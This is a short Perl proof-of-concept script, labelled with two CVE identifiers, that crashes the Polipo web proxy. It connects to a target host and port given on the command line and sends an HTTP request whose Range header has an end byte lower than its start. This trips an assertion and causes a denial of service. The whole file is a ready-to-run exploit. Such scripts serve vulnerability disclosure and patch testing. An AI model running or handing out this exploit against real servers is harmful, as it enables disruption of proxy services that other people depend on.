#!/usr/bin/env perl
#
# Polipo denial of service via malformed Range header
#
# CVE-2020-36420
# CVE-2021-38614
#
# Trigger: assertion failure on invalid byte range (to < from)
#

use autodie;
use Socket;

die "usage: $0 host port\n" if @ARGV != 2;

$host = $ARGV[0];
$port = $ARGV[1];

$iaddr = inet_aton      $host;
$paddr = sockaddr_in    $port, $iaddr;
$proto = getprotobyname 'tcp';

socket  SOCK, PF_INET, SOCK_STREAM, $proto;
connect SOCK, $paddr;
send    SOCK, "GET http:// HTTP/1.1\r\n", 0;
send    SOCK, "Range: bytes=3-2\r\n\r\n", 0;
print   while <SOCK>;

# End of file.
